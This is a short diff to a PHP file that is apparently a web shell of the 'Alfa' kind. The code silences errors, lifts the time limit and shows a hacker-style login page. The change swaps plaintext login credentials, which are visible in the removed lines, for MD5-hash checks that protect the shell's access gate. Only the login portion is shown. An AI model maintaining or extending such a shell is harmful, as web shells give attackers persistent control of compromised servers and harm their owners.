@@ -3,9 +3,16 @@ session_start();
 error_reporting(0);
 set_time_limit(0);
 
-// --- LOGIN SYSTEM ---
-$user = "joker25"; $pass = "meledakkita123";
-if (isset($_POST['login'])) { if ($_POST['u'] == $user && $_POST['p'] == $pass) $_SESSION['alfa_session'] = true; }
+// --- LOGIN SYSTEM (MD5 UPDATED) ---
+$user = "97c664bbefca68f6c78456ea82db367d"; // 
+$pass = "137bfd55cdde4b1a830f97759c1acb28"; // 
+
+if (isset($_POST['login'])) { 
+    if (md5($_POST['u']) == $user && md5($_POST['p']) == $pass) {
+        $_SESSION['alfa_session'] = true; 
+    }
+}
+
 if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
 if (!isset($_SESSION['alfa_session'])) {
     die('<body style="background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;">
